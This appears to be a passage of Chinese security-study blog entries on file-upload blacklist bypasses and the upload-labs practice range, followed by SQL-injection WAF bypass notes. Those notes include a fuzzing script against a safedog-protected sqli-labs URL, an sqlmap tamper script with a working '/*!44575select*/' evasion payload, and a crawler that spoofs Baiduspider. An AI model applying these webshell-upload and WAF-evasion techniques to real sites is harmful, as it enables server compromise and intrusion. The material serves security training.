src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E9%BB%91%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%A1%88%E4%BE%8B/11.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;查看后能够发现其对存在黑名单中的字符进行替换，但<code>str_ireplace()</code>函数只替换一次，因此修改文件名为<code>1.pphphp</code>就可以实现绕过</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传——验证/绕过</title>
    <link href="/2022/09/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
    <url>/2022/09/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传——验证-绕过"><a href="#文件上传——验证-绕过" class="headerlink" title="文件上传——验证/绕过"></a>文件上传——验证/绕过</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;一般而言，在文件上传的常见验证中分为客户端验证和服务端验证，客户端验证主要是写入JavaScript脚本，校验上传文件的后缀名，可以通过在浏览加载文件，单但没有点击上传按钮就弹出警报窗，这一般就是前端的验证。（注：一般不提交是不会有报文的）</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/1.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="1-文件上传常见验证"><a href="#1-文件上传常见验证" class="headerlink" title="1.文件上传常见验证"></a>1.文件上传常见验证</h4><ul><li><p>后缀名</p><ul><li>黑名单</li></ul><p>&emsp;&emsp;黑名单明确了不允许上传的格式和后缀，例如不允许上传带有asp,php,jjsp等格式的后缀，因此我们可以寻找没有限制到的格式进行文件上传漏洞的利用。</p><ul><li>白名单</li></ul><p>&emsp;&emsp;白名单是明确了上传文件的后缀格式，例如明确要求是jpg、png、zip等格式，因为相对于黑名单而言，由于无法寻找到没有限制的格式，所以白名单会相对更加安全。</p></li><li><p>文件类型：</p><p>&emsp;&emsp;MIME是描述消息内容类型的因特网标准。其消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。Content-Type中的内容也就是MIME，不同的应用程序支持不同的 MIME 类型。</p><p><a href="https://www.w3school.com.cn/media/media_mimeref.asp">https://www.w3school.com.cn/media/media_mimeref.asp</a></p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/2.jpg" style="zoom:80%;" /></center></li><li><p>文件头（内容头信息）：</p></li></ul><p>&emsp;&emsp;&emsp;&emsp;<a href="https://blog.csdn.net/ccj2020/article/details/87603903">https://blog.csdn.net/ccj2020/article/details/87603903</a></p><table><thead><tr><th align="center">文件类型</th><th align="center">文件头</th></tr></thead><tbody><tr><td align="center">JPEG（jpg）</td><td align="center">FFD8FFE1</td></tr><tr><td align="center">PNG（png）</td><td align="center">89504E47</td></tr><tr><td align="center">GIF（gif）</td><td align="center">47494638</td></tr><tr><td align="center">TIFF</td><td align="center">49492A00</td></tr><tr><td align="center">Windows Bitmap</td><td align="center">424DC001</td></tr><tr><td align="center">ZIP Archive</td><td align="center">504B0304</td></tr><tr><td align="center">RAR Archive（rar）</td><td align="center">5261721</td></tr><tr><td align="center">Adobe Photoshop（psd）</td><td align="center">38425053</td></tr><tr><td align="center">Rich Text Format（rtf）</td><td align="center">7B5C727466</td></tr><tr><td align="center">XML（xml）</td><td align="center">3C3F786D6C</td></tr><tr><td align="center">HTML（html）</td><td align="center">68746D6C3E</td></tr><tr><td align="center">Adobe Acrobat（pdf）</td><td align="center">255044462D312E</td></tr><tr><td align="center">Wave （wav）</td><td align="center">57415654</td></tr></tbody></table><p>&emsp;</p><p>（接下来以upload——labs为例）</p><h4 id="2-Pass-01（前端验证）"><a href="#2-Pass-01（前端验证）" class="headerlink" title="2.Pass-01（前端验证）"></a>2.Pass-01（前端验证）</h4><p>&emsp;&emsp;查看提交界面：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/3.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;接下来查看前端代码：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/4.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见在前端的js代码中存在相关的验证，我们只需要修改相关验证即可：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/5.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;点击进行webshell文件上传：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/6.jpg" style="zoom:60%;" /></center><p>&emsp;&emsp;可以看见上传成功。</p><p>&emsp;</p><h4 id="3-Pass-02（MIME验证）"><a href="#3-Pass-02（MIME验证）" class="headerlink" title="3.Pass-02（MIME验证）"></a>3.Pass-02（MIME验证）</h4><p>&emsp;&emsp;根据提示，该文件上传是MIME类型，也就是需要使用抓包工具进行抓包处理，先看提交界面：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/7.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;抓包查看MIME值：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/8.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;修改MIME值：</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/9.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;文件上传成功</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/10.jpg" style="zoom:60%;" /></center>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传——基础知识</title>
    <link href="/2022/09/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/09/06/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传——基础知识"><a href="#文件上传——基础知识" class="headerlink" title="文件上传——基础知识"></a>文件上传——基础知识</h1><h4 id="1-文件上传的简介"><a href="#1-文件上传的简介" class="headerlink" title="1.文件上传的简介"></a>1.文件上传的简介</h4><p>&emsp;&emsp;由于开发源在对用户文件上传功能的实现代码中没有严格限制用户上传的文件后缀、文件类型或者相关的处理缺陷，导致了攻击者能够越过其本身的权限向服务器上传可执行的动态脚本文件</p><p>&emsp;&emsp;简单而言，就是开发员的检验不严谨，使得攻击者能够通过上传可执行脚本从而获取到执行服务器端命令的能力</p><p>&emsp;</p><h4 id="2-文件上传的原理"><a href="#2-文件上传的原理" class="headerlink" title="2.文件上传的原理"></a>2.文件上传的原理</h4><p>&emsp;&emsp;在文件上传的功能处，如果服务器脚本语言并没有对上传的文件进行严格的验证、检验以及过滤的话，就会导致攻击者能够上传一个Webshell到Web可访问的目录上，并将恶意文件传递给语言解释器去执行，之后就能够才服务器上获取命令权限，从而就行数据库执行，文件管理等相关的恶意操作。也有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护</p><p>&emsp;</p><h4 id="3-文件上传的查找与判断"><a href="#3-文件上传的查找与判断" class="headerlink" title="3.文件上传的查找与判断"></a>3.文件上传的查找与判断</h4><ul><li><p>黑盒测试</p><ul><li><p>文件后台</p><p>&emsp;&emsp;进入网站后台后，不一定能获取网站权限</p></li><li><p>个人中心</p><p>&emsp;&emsp;通过图片上传</p></li><li><p>文件扫描</p><p>&emsp;&emsp;使用工具进行扫描，得出相应的后台路径</p></li></ul></li><li><p>白盒测试</p><ul><li>进行代码分析</li><li>查找文件上传功能</li></ul></li></ul><p>&emsp;</p><h4 id="4-文件上传漏洞危害"><a href="#4-文件上传漏洞危害" class="headerlink" title="4.文件上传漏洞危害"></a>4.文件上传漏洞危害</h4><ul><li>上传webshell，控制服务器，远程命令执行</li><li>上传系统百度、木马文件、构造僵尸网络</li><li>修改web界面</li><li>网络挂马和钓鱼</li><li>内网渗透</li><li>等等</li></ul><p>&emsp;</p><h4 id="5-文件上传漏洞注意事项"><a href="#5-文件上传漏洞注意事项" class="headerlink" title="5.文件上传漏洞注意事项"></a>5.文件上传漏洞注意事项</h4><p>&emsp;&emsp;在文件上传的类型中， 我们需要去判别对应的文件上传利用方向，不同的方向有着不同的思路与渗透方法，如何判是在利用漏洞中的注意事项</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3.png" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="6-文件上传在实际应用的说明"><a href="#6-文件上传在实际应用的说明" class="headerlink" title="6.文件上传在实际应用的说明"></a>6.文件上传在实际应用的说明</h4><h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><ul><li>​     先直接传一个PHP文件，实战先传简单的试试。</li><li>​    然后传一个正常的图片，看看有无返回存储地址。</li><li>​    如果能上传就直接解析。</li></ul><h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><p>&emsp;&emsp;先传一个shell，然后进行修改。查看报文里面的内容connect-Type:image/jpeg，看看是否可以进行绕过，如果不行，在上传内容添加GIF89a（这个是图片相关格式的文件头）。当然上传了还得看是否能够被解析为php，所有的上传都要考虑是否能够被解析。</p><h6 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h6><ul><li><p>上传一个abc.abcd，目的只是为了查看是否为白名单还是黑名单绕过。黑名单限制一般为此文件类型不允许上传，考虑双写，大小写，空格，php2,php3,php4,php5,phtphtml,等方式</p></li><li><p>继续上传一个/htaccess文件，查看.htaccess文件能够设置服务器的解析文件的格式，匹配到dudu就已php的格式来解析，继而上传马</p></li><li><p>如果说.htaccess不能上传，接下来上传一个.user.ini，继而上传一个马</p></li></ul><h6 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h6><p>​    如果白名单限制上传</p><ul><li>考虑00截断上传</li><li>文件包含漏洞+图片马</li><li>文件包含漏洞+二次渲染+图片马</li></ul><h6 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h6><p>&emsp;&emsp;上传的东西是否被服务器很快的删除或者移除，或者说上传成功，但是无法访问，这里就需要考虑条件竞争。</p><p>&emsp;</p><h4 id="7-相关案例演示"><a href="#7-相关案例演示" class="headerlink" title="7.相关案例演示"></a>7.相关案例演示</h4><p>&emsp;&emsp;（图片均来源于小迪安全）</p><h5 id="（1）常规文件上传地址的获取"><a href="#（1）常规文件上传地址的获取" class="headerlink" title="（1）常规文件上传地址的获取"></a>（1）常规文件上传地址的获取</h5><ul><li>使用搜索引擎进行该网站的搜索inurl:upload.php</li></ul><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1.jpg" style="zoom:80%;" /></center><ul><li>使用工具扫描该该网址</li></ul><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="（2）不同格式下的文件类型后门测试"><a href="#（2）不同格式下的文件类型后门测试" class="headerlink" title="（2）不同格式下的文件类型后门测试"></a>（2）不同格式下的文件类型后门测试</h5><p>&emsp;&emsp;要遵守上传的格式，不同的格式对应着相对格式的渗透与上传漏洞利用</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/4.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/5.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;改变文件后缀名为jpg，再次访问</p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/6.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;可以看见，访问该格式，里面的代码内容并不会被执行</p><p>&emsp;</p><h5 id="（3）配合解析漏洞下的文件类型后门测试"><a href="#（3）配合解析漏洞下的文件类型后门测试" class="headerlink" title="（3）配合解析漏洞下的文件类型后门测试"></a>（3）配合解析漏洞下的文件类型后门测试</h5><p>相关靶场：</p><p>&emsp;&emsp;<a href="https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerabilit">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerabilit</a></p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/12.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="（4）本地文件上传漏洞靶场环境搭建"><a href="#（4）本地文件上传漏洞靶场环境搭建" class="headerlink" title="（4）本地文件上传漏洞靶场环境搭建"></a>（4）本地文件上传漏洞靶场环境搭建</h5><p><a href="https://github.com/c0ny1/upload-labs%EF%BC%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%EF%BC%89">https://github.com/c0ny1/upload-labs（文件上传靶场）</a></p><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/7.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h5 id="（5）某CMS及CVE编号文件上传漏洞"><a href="#（5）某CMS及CVE编号文件上传漏洞" class="headerlink" title="（5）某CMS及CVE编号文件上传漏洞"></a>（5）某CMS及CVE编号文件上传漏洞</h5><h6 id="CMS"><a href="#CMS" class="headerlink" title="CMS :"></a>CMS :</h6><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/8.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/9.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/10.jpg" style="zoom:80%;" /></center><center><img src="/img/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/11.jpg" style="zoom:80%;" /></center><p>&emsp;&emsp;虽然这里显示上传失败，但是后台的文件中依旧是有我们上传的文件，也就是说，其实如何去判断后台是否成功是很关键的，所以不能轻易下结论。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——WAF绕过（二）</title>
    <link href="/2022/08/29/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2022/08/29/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——WAF绕过（二）"><a href="#SQL注入——WAF绕过（二）" class="headerlink" title="SQL注入——WAF绕过（二）"></a>SQL注入——WAF绕过（二）</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;对于WAF而言，需要形成一定的绕过体系与知识，才能很好的去针对这种情况的渗透，我们需要去自我一些脚本的知识来帮助我们进行攻击。</p><p>&emsp;</p><h4 id="1-Fuzz绕过脚本"><a href="#1-Fuzz绕过脚本" class="headerlink" title="1.Fuzz绕过脚本"></a>1.Fuzz绕过脚本</h4><p>（来源：小迪安全）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests,time<br><br>url=<span class="hljs-string">&#x27;http://127.0.0.1:8080/sqli/Less-2/?id=-1&#x27;</span><br>union=<span class="hljs-string">&#x27;union&#x27;</span><br>select=<span class="hljs-string">&#x27;select&#x27;</span><br>num=<span class="hljs-string">&#x27;1,2,3&#x27;</span><br>a=&#123;<span class="hljs-string">&#x27;%0a&#x27;</span>,<span class="hljs-string">&#x27;%23&#x27;</span>&#125;<br>aa=&#123;<span class="hljs-string">&#x27;x&#x27;</span>&#125;<br>aaa=&#123;<span class="hljs-string">&#x27;%0a&#x27;</span>,<span class="hljs-string">&#x27;%23&#x27;</span>&#125;<br>b=<span class="hljs-string">&#x27;/*!&#x27;</span><br>c=<span class="hljs-string">&#x27;*/&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bypass</span>():<br><span class="hljs-keyword">for</span> xiaodi <span class="hljs-keyword">in</span> a:<br><span class="hljs-keyword">for</span> xiaodis <span class="hljs-keyword">in</span> aa:<br><span class="hljs-keyword">for</span> xiaodiss <span class="hljs-keyword">in</span> aaa:<br><span class="hljs-keyword">for</span> two <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44500</span>,<span class="hljs-number">44600</span>):<br>urls=url+xiaodi+xiaodis+xiaodiss+b+<span class="hljs-built_in">str</span>(two)+union+c+xiaodi+xiaodis+xiaodiss+select+xiaodi+xiaodis+xiaodiss+num<br><span class="hljs-comment">#urlss=url+xiaodi+xiaodis+xiaodiss+union+xiaodi+xiaodis+xiaodiss+b+str(two)+select+c+xiaodi+xiaodis+xiaodiss+num</span><br><span class="hljs-keyword">try</span>:<br>result=requests.get(urls).text<br>len_r=<span class="hljs-built_in">len</span>(result)<br><span class="hljs-keyword">if</span> (result.find(<span class="hljs-string">&#x27;safedog&#x27;</span>)==-<span class="hljs-number">1</span>):<br><span class="hljs-comment">#print(&#x27;bypass url addreess：&#x27;+urls+&#x27;|&#x27;+str(len_r))</span><br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;bypass url addreess：&#x27;</span>+urls+<span class="hljs-string">&#x27;|&#x27;</span>+<span class="hljs-built_in">str</span>(len_r))<br><span class="hljs-keyword">if</span> len_r==<span class="hljs-number">715</span>:<br>                             fp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<br>                             fp.write(urls+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>                             fp.close()<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> err:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connecting error&#x27;</span>)<br>time.sleep(<span class="hljs-number">0.1</span>)<br><br>if__name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;fuzz strat!&#x27;</span>)<br>bypass()<br></code></pre></td></tr></table></figure><p>&emsp;</p><h5 id="2-Payload脚本"><a href="#2-Payload脚本" class="headerlink" title="2.Payload脚本"></a>2.Payload脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)</span><br><span class="hljs-string">Seethefile&#x27;LICENSE&#x27;forcopyingpermission</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">from</span> lib.core.common <span class="hljs-keyword">import</span> singleTimeWarnMessage<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> DBMS<br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><br>__priority__ = PRIORITY.HIGHEST<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br>    singleTimeWarnMessage(<span class="hljs-string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>], DBMS.MYSQL))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br>    <span class="hljs-comment"># %23a%0aunion/*!44575select*/1,2,3</span><br>    <span class="hljs-keyword">if</span> payload:<br>        payload = payload.replace(<span class="hljs-string">&quot;union&quot;</span>, <span class="hljs-string">&quot;%23a%0aunion&quot;</span>)<br>        payload = payload.replace(<span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;/*!44575select*/&quot;</span>)<br>        payload = payload.replace(<span class="hljs-string">&quot;%20&quot;</span>, <span class="hljs-string">&quot;%23a%0a&quot;</span>)<br>        payload = payload.replace(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;%23a%0a&quot;</span>)<br>        payload = payload.replace(<span class="hljs-string">&quot;database()&quot;</span>, <span class="hljs-string">&quot;database%23a%0a()&quot;</span>)<br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure><p>&emsp;</p><h4 id="3-伪装百度的爬虫脚本"><a href="#3-伪装百度的爬虫脚本" class="headerlink" title="3.伪装百度的爬虫脚本"></a>3.伪装百度的爬虫脚本</h4><p>（搜索引擎爬虫 http 指纹头）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;http://192.168.0.103:8080/&#x27;</span><br><br>head=&#123;<br><span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0(compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)&#x27;</span><br>&#125;<br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;PH1P.txt&#x27;</span>):<br>    data=data.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    urls=url+data<br>    code=requests.get(urls.headers=head).status_code<br>    <span class="hljs-built_in">print</span>(urls+<span class="hljs-string">&#x27;|&#x27;</span>+<span class="hljs-built_in">str</span>(code))<br></code></pre></td></tr></table></figure><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87%EF%BC%88%E4%BA%8C%EF%BC%89/3.jpg" style="zoom:80%;" /></center><p>&emsp;</p><h4 id="4-中转注入"><a href="#4-中转注入" class="headerlink" title="4.中转注入"></a>4.中转注入</h4><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;sqlmap注入本地的脚本地址——&gt;本地搭建脚本（请求书包自定义编写）——&gt;远程地址</p><p>&emsp;&emsp;当受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。</p><p>参考资源</p><h5 id="》涉及相关链接网址："><a href="#》涉及相关链接网址：" class="headerlink" title="=》涉及相关链接网址："></a>=》涉及相关链接网址：</h5><ul><li><a href="https://www.cnblogs.com/keta/p/9469417.html">https://www.cnblogs.com/keta/p/9469417.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入——WAF绕过（一）</title>
    <link href="/2022/08/28/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87/"/>
    <url>/2022/08/28/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入——WAF绕过（一）"><a href="#SQL注入——WAF绕过（一）" class="headerlink" title="SQL注入——WAF绕过（一）"></a>SQL注入——WAF绕过（一）</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;首先了解一下什么是WAF，Web应用防护系统（也称为：<a href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。</p><p>&emsp;&emsp;因为普通防火墙难以检测和阻断某些情况，由此产生了WAF。Web应用防护系统，代表了一类新兴的信息安全技术，用以解决诸如防火墙一类传统设备束手无策的Web应用安全问题。与传统防火墙不同，WAF工作在应用层，因此对Web应用防护具有先天的技术优势。基于对Web应用业务和逻辑的深刻理解，WAF对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，从而对各类网站站点进行有效防护。</p><center><img src="/img/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94WAF%E7%BB%95%E8%BF%87/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;</p><h4 id="1-WAF分类"><a href="#1-WAF分类" class="headerlink" 